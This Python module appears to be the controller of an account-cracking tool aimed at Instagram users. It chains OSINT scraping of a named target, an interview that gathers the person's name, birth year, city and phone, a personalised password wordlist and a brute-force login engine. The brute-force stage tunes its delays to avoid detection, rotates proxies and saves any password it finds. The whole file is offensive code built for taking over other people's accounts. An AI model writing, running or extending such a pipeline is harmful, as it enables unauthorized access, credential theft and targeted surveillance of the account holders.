#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AI Controller — the master brain.
Orchestrates OSINT, Dictionary, and Brute with intelligent decision-making.
"""
import os, time
from .brain import AIBrain
from ..banner import ai, info, ok, warn, err, C
from ..osint import OSINT
from ..interviewer import Interviewer
from ..wordlist import WordlistAI
from ..brute import BruteEngine

OUTPUT_DIR = "output"
DEFAULT_WL_SIZE = 18000

class AIController:
    def __init__(self, username):
        self.username = username.strip().lstrip("@")
        self.brain = AIBrain()
        self.brain.current_phase = "init"
        self.hints = {}
        self.osint_data = {}
        self.answers = {}
        self.wordlist_path = ""
        self.found_password = None

    def run_osint(self, proxy=None):
        """AI-controlled OSINT with auto-healing."""
        self.brain.current_phase = "osint"
        self.brain.start_session(self.username)

        ai("Starting AI-controlled OSINT...")
        sid = os.environ.get("IG_SESSIONID") or None
        bot = OSINT(self.username, OUTPUT_DIR, proxy, sessionid=sid)

        # AI picks best method order
        data = bot.scrape()

        if data:
            ok(f"OSINT successful for @{self.username}")
            self.brain.handle_osint_result(True, bot.data.get("source", "multi"), True)
            self.hints = bot.get_hints()
            self.osint_data = data
            self.brain.memory.add_learning(
                f"OSINT OK: followers={self.hints.get('followers', 0)}, "
                f"posts={self.hints.get('posts', 0)}, "
                f"private={self.hints.get('is_private', False)}"
            )
            return True
        else:
            err(f"OSINT failed for @{self.username}")
            self.brain.handle_osint_result(False, "multi", False)
            healing = self.brain.healer.diagnose("empty_data", self.username)
            self.brain.healer.apply_healing(healing)
            self.hints = {"username": self.username}
            return False

    def run_interview(self):
        """AI-monitored interview."""
        self.brain.current_phase = "interview"
        ai("Starting interview — guide the user through intel gathering...")

        interviewer = Interviewer(self.username, self.hints, OUTPUT_DIR)
        self.answers = interviewer.run()

        filled = sum(1 for k, v in self.answers.items()
                     if k != "username" and v not in (None, "", 0, [], {}))
        self.brain.memory.add_learning(f"Interview: {filled} fields filled")
        ok(f"AI analyzed: {filled} intel fields collected")

        if filled < 5:
            warn("AI warning: very few fields filled — dictionary will be weak!")
            ai("Consider adding: full_name, nickname, birth_year, city, phone")

        return self.answers

    def run_dictionary(self, target_count=DEFAULT_WL_SIZE):
        """AI-monitored dictionary generation."""
        self.brain.current_phase = "dictionary"
        ai("Generating targeted dictionary from your intel...")

        if not self.answers:
            self.answers = {"username": self.username}

        wordlist = WordlistAI(self.answers, target_count=target_count)
        t0 = time.time()
        wordlist.generate()
        gen_time = time.time() - t0

        self.wordlist_path = os.path.join(OUTPUT_DIR, self.username, "wordlist.txt")
        wordlist.save(self.wordlist_path)

        self.brain.memory.add_learning(
            f"Dict: {wordlist.count} passwords in {gen_time:.1f}s | "
            f"{wordlist.report()}"
        )
        ok(wordlist.report())
        ok(f"Saved → {self.wordlist_path}")

        return self.wordlist_path, wordlist.count

    def run_brute(self, delay_min=3.0, delay_max=5.0, proxy_file=None, resume=False):
        """AI-controlled brute force with intelligent timing and proxy management."""
        self.brain.current_phase = "brute"

        if not self.wordlist_path:
            self.wordlist_path = os.path.join(OUTPUT_DIR, self.username, "wordlist.txt")

        if not os.path.isfile(self.wordlist_path):
            err("No wordlist found. Run dictionary first.")
            return None

        # AI adjusts delays based on history
        strategy = self.brain.healer.suggest_strategy(
            self.brain.memory.get_target_stats(self.username)
        )

        if strategy == "cautious":
            delay_min = max(delay_min, 5.0)
            delay_max = max(delay_max, 8.0)
            ai("Cautious mode: increased delays to avoid detection")
        elif strategy == "aggressive":
            delay_min = max(2.0, delay_min * 0.7)
            delay_max = max(3.0, delay_max * 0.7)
            ai("Aggressive mode: reduced delays (target has no defense history)")
        elif strategy == "avoid":
            warn("AI recommends MANUAL approach for this target — it has strong defenses")
            if input(f"{C.Y}[?]{C.E} Continue anyway? [y/N]: ").strip().lower() != "y":
                return None

        ai(f"Brute delays: {delay_min:.1f}-{delay_max:.1f}s | strategy: {strategy}")

        engine = BruteEngine(
            self.username, self.wordlist_path, OUTPUT_DIR,
            delay_min=delay_min, delay_max=delay_max,
            proxy_file=proxy_file, resume=resume,
            ai_controller=self
        )

        self.found_password = engine.run()

        if self.found_password:
            self.brain.end_session(f"PASSWORD FOUND: {self.found_password}")
        elif engine._checkpoints:
            self.brain.end_session(f"No password | {len(engine._checkpoints)} checkpoints")
        else:
            self.brain.end_session("No password found")

        return self.found_password

    def run_full_attack(self, proxy_file=None):
        """Run complete pipeline: OSINT → Interview → Dictionary → Brute."""
        self.brain.start_session(self.username)

        # Phase 1: OSINT
        ai("=" * 50)
        ai("PHASE 1/4: OSINT Reconnaissance")
        ai("=" * 50)
        self.run_osint()

        # Phase 2: Interview
        ai("=" * 50)
        ai("PHASE 2/4: Intel Interview")
        ai("=" * 50)
        self.run_interview()

        # Phase 3: Dictionary
        ai("=" * 50)
        ai("PHASE 3/4: Dictionary Generation")
        ai("=" * 50)
        path, count = self.run_dictionary()

        # Phase 4: Brute
        ai("=" * 50)
        ai("PHASE 4/4: Intelligent Brute Force")
        ai("=" * 50)
        print(f"\n{C.R}  {count} passwords prepared for @{self.username}{C.E}")

        from ..banner import yesno
        if not yesno("Launch brute force?", default_yes=True):
            warn("Brute skipped. Dictionary saved.")
            self.brain.end_session("Brute skipped by user")
            return None

        result = self.run_brute(proxy_file=proxy_file)

        if result:
            print(f"\n{C.G}{'═' * 42}{C.E}")
            print(f"{C.G}  ║  PASSWORD FOUND: {result}{C.E}")
            print(f"{C.G}  ║  Saved: {OUTPUT_DIR}/{self.username}/found.txt{C.E}")
            print(f"{C.G}{'═' * 42}{C.E}")

        return result

    def show_ai_status(self):
        """Display AI brain status."""
        status = self.brain.get_status()
        mem = status["memory"]
        print(f"""
{C.M}╔══════════════════════════════════════════════════╗
║              AI CONTROLLER STATUS                 ║
╠══════════════════════════════════════════════════╣
║  Target      : @{status['target'] or 'none':<36} ║
║  Phase       : {status['phase'] or 'idle':<38} ║
║  State       : {status['state']:<38} ║
║  Elapsed     : {status['elapsed']:.0f}s{' ' * (32 - len(str(int(status['elapsed']))))} ║
╠══════════════════════════════════════════════════╣
║  Total Ops   : {mem['ops']:<38} ║
║  Success     : {mem['success_rate']:<38} ║
║  Targets     : {mem['targets']:<38} ║
║  Rate Limits : {mem['rate_limits']:<38} ║
║  Checkpoints : {mem['checkpoints']:<38} ║
║  Proxies     : {mem['proxies_used']} used / {mem['proxies_dead']} dead{' ' * (25 - len(str(mem['proxies_used'])) - len(str(mem['proxies_dead'])))} ║
║  Learnings   : {mem['learnings']:<38} ║
╠══════════════════════════════════════════════════╣
║  Adaptive Delays:                                ║
║    osint     : {mem['adaptive_delays'].get('osint', 'N/A')}s{' ' * (28 - len(str(mem['adaptive_delays'].get('osint', 'N/A'))))} ║
║    brute_min : {mem['adaptive_delays'].get('brute_min', 'N/A')}s{' ' * (28 - len(str(mem['adaptive_delays'].get('brute_min', 'N/A'))))} ║
║    brute_max : {mem['adaptive_delays'].get('brute_max', 'N/A')}s{' ' * (28 - len(str(mem['adaptive_delays'].get('brute_max', 'N/A'))))} ║
╚══════════════════════════════════════════════════╝{C.E}
""")
